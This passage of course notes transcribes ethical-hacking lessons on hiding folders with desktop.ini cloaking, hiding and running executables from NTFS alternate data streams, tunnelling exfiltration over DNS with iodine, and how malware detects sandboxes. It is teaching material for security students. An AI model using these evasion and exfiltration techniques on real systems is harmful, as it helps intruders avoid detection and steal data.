> **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=53)** Let's try to change directories and go into it.
>
> **[0:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=56)** That worked.
>
> **[0:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=58)** Let's see what we've got here.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=60)** We have a desktop.ini file, so let's have a look at what's inside it.
>
> **[1:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=67)** This is the method Microsoft uses to hide folders.
>
> **[1:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=71)** We can see it includes two cloaking entries.
>
> **[1:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=74)** The first is a CLSID line, which stops the sub-directory from being included in file based finds.
>
> **[1:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=81)** And the second, the UICLSID line, which stops the sub-directory from being seen using Windows Explorer.
>
> **[1:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=90)** Unless you know the folder's there, you're not going to see it.
>
> **[1:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=95)** Microsoft isn't the only user of hidden folders.
>
> **[1:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=98)** Malware can also use them to evade detection.

> [!info]- Semantic Content
>
> **Code Keywords:** let (4)
> **CLI Commands:** cd (2)
> **Env Vars:** clsid (1), uiclsid (1)
> **File Paths:** desktop.ini (1)
> **Definitions:** is a  (1)
> **Speakers:** - [instructor] (1)

#### Embedding malware in an alternate data stream
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=1)** - [Instructor] A novel way of hiding files on disc is to use what's known as an alternate data stream.
>
> **[0:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=6)** Originally, files were simply strings of bytes which could be read byte by bytes by applications.
>
> **[0:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=12)** That's no longer the case.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=15)** In NTFS, a file is a complex structure.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=18)** NTFS files contain at a minimum a section called $DATA, which is where the data read by an application resides.
>
> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=27)** This is the data stream.
>
> **[0:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=29)** However, a file may have many other sections, each with its own name, and each of which can hold information.
>
> **[0:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=35)** These are called alternate data streams.
>
> **[0:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=38)** Importantly, Windows only recognizes the $DATA section, so data in any alternate data stream is hidden.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=47)** I've created a text file called ode.txt and we can see the poetic contents.
>
> **[0:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=55)** Let's check its size.
>
> **[0:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=59)** And we can see it's 180 bytes long.
>
> **[1:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=63)** I'll create another file called adsfile.txt
>
> **[1:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=75)** and this is my secret message to Akhtar
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=84)** where no one can find it.
>
> **[1:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=90)** Now I'll insert that into a hidden data stream in ode.txt by typing type adsfile.txt to ode.txt
>
> **[1:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=104)** and call it hidden.txt.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=107)** Let's see what ode.txt looks like now.
>
> **[1:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=110)** I'll type ode.txt, and we can see it's still 181 bytes long.
>
> **[2:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=121)** There's apparently no change.
>
> **[2:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=124)** However, if I now type more ode.txt hidden.txt,
>
> **[2:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=134)** we see the hidden text.
>
> **[2:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=136)** Alternate data streams can be used to hide executable files.
>
> **[2:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=140)** As an example, I'll insert the Windows calculator into this text file.
>
> **[2:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=146)** Type \windows\system32\calc.exe into ode.txt
>
> **[2:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=160)** in an alternate data stream called mycalc.exe.
>
> **[2:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=169)** Again, we see no change in the file size in ode.text.
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=173)** Prior to Windows 7, executables could be started easily from an alternate data stream.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=178)** That capability was taken out from Windows 7 onwards.
>
> **[3:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=183)** Nevertheless, there are ways in which EXE and DLL files can be executed.
>
> **[3:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=187)** Let's have a look at one example.
>
> **[3:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=190)** Forfiles /P c:\windows\system32 /m notepad.exe
>
> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=205)** /c :\temp\ode.txt mycalc.exe,
>
> **[3:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=220)** and we can see the calculator.
>
> **[3:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=223)** While alternate data streams can't be seen in the normal Windows interface, it is possible to use the special /r command line option on the dir command to see them, dir ode.txt /r.
>
> **[3:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=238)** Now we can see that this file has two additional streams, hidden.txt and mycalc.exe.

> [!info]- Semantic Content
>
> **File Paths:** ode.txt (9), hidden.txt (3), adsfile.txt (2)
> **Env Vars:** ntfs (2), data (2), exe (1), dll (1)
> **Code Keywords:** let (3), case. (1), interface (1)
> **Definitions:** known as (1), is a  (1)
> **CLI Commands:** find (1)
> **Tools:** command line (1)
> **Speakers:** - [instructor] (1)

#### Tunneling through DNS with iodine
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=1)** - [Instructor] Once we've breached the system and want to start sending data back, we might want to hide our exfiltration in a protocol which is unlikely to be monitored.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=10)** One such protocol is DNS and Kali comes with a tool called iodine, which is designed for exactly this purpose.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=18)** We'll normally run this using a registered public server but for the purposes of understanding how it works, let's set our iodine server up on Kali.
>
> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=27)** We do that quite simply by entering sudo iodine D, minus F, 10.0.0.1, [test.com](https://test.com) and we'll enter our password for the transmissions.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=42)** Okay, we've instructed iodine to create a new virtual network using the IP address 10.0.0.1 with a DNS name of [test.com](https://test.com).
>
> **[0:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=52)** Let's check in Wireshark to confirm this.
>
> **[0:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=55)** We can see we've now got a new network adapter called DNS0.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=60)** Let's start capturing traffic on that.
>
> **[1:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=67)** I've already installed iodine on Hydra, so let's use the client to connect to our server using the same DNS name: sudo iodine, minus F, minus R, and our server's running on 192.168.1.249 with a DNS name of [test.com](https://test.com) and we'll put in the password that we put in on the server.
>
> **[1:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=98)** Okay, we are now set up.
>
> **[1:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=100)** So let's try to ping the server with five ping packets.
>
> **[1:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=106)** Ping 10.0.0.1, minus C, five.
>
> **[1:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=113)** And we can see the pings being sent.
>
> **[1:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=115)** And back in Wireshark, we can see that they've come through as ICMP traffic.
>
> **[2:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=121)** This has come through as ICMP traffic over DNS, on the DNS0 interface.
>
> **[2:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=127)** So let's stop this and we'll start another capture,
>
> **[2:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=137)** and we'll do it on ethernet zero this time.
>
> **[2:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=142)** And back in Hydra, we'll send five more packets.
>
> **[2:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=148)** And we'll stop the transmission and we can see we're getting DNS packets coming through from our Hydro server on 192.168.1.51 to 192.168.249.

> [!info]- Semantic Content
>
> **Env Vars:** dns (6), dns0 (2), icmp (2)
> **Code Keywords:** let (6), public (1), this. (1), interface (1)
> **Versions:** 10.0.0 (3), 192.168.1 (2), 192.168.249 (1)
> **URLs:** [test.com](https://test.com) (3)
> **CLI Commands:** sudo (2)
> **Prerequisites:** set up (1)
> **Speakers:** - [instructor] (1)

#### Checking for oversight
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=1)** - [Instructor] Storing malware on a live system in order to analyze it can be dangerous as one misstep might mean a complete network is rapidly infected.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=10)** Consequently, an isolated environment, such as a virtual machine, is often used to provide protection.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=17)** Similarly, a sandbox appliance can be used to safely execute attachments before they're allowed to enter the organizational network.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=26)** Unsurprisingly, malware authors have responded to this, and so malware is often designed to detect isolated environments.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=34)** A simple way of checking is to issue the CpuId assembler instruction, which provides details of the hypervisor brand.
>
> **[0:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=43)** Additional areas which may indicate virtualization include registry entries and network adapters.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=50)** The malware may also look for specific configuration files.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=54)** There are many other signs of virtualization or sandboxing which have been used to take evasive action.
>
> **[1:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=61)** There are a number of actions malware can take if it's being watched.
>
> **[1:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980&t=65)** The three most common evasive tactics are to terminate, to alter its behavior to avoid performing any malicious activity while running, and to enter a sleep phase and not execute for some time to allow the monitoring to finish.

> [!info]- Semantic Content
>
> **Code Keywords:** this, (1)
> **Analogies:** such as (1)
> **Speakers:** - [instructor] (1)


### Conclusion

#### Next steps
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=1)** - [Malcolm] I'd really like to thank you for joining me for this course.
>
> **[0:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=4)** I hope you enjoyed learning about perimeter defenses.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=8)** There's always something new in cybersecurity and if you're interested in learning more, then check out the full cybersecurity ethical hacking segment of the library, where new security testing courses are added regularly.
>
> **[0:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=21)** You'll find a range of courses on ethical hacking and security, in general.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=26)** I'd like to invite you to visit my LinkedIn Learning page and check out my ethical hacking, security, and programming courses.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=34)** If you want to learn about how to test mobile devices, then check out the Mobile Devices course.
>
> **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=40)** If you'd like to learn about security for the cloud, then Cybersecurity for Cloud Computing is for you.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=47)** Thanks again for joining me on this course and I hope to see you again soon.

> [!info]- Semantic Content
>
> **CLI Commands:** find (1)
> **Speakers:** - [malcolm] (1)


## Path Context

### In [[Become an Ethical Hacker]]
← [[Ethical Hacking- Session Hijacking]] | **12 of 19** | [[Ethical Hacking- Hacking Web Servers and Web Applications]] →

## Appears In

- [[Become an Ethical Hacker]]

## Related Courses

_Courses sharing skills:_

- [[Offensive Penetration Testing]] — Ethical Hacking
- [[Stealth Penetration Testing with Advanced Enumeration]] — Ethical Hacking
- [[Kali Linux for Advanced Pen Testing and Ethical Hacking]] — Ethical Hacking
- [[Ethical Hacking- SQL Injection]] — Ethical Hacking
- [[Ethical Hacking- Cloud Computing]] — Ethical Hacking

---

[↑ Back to top](#)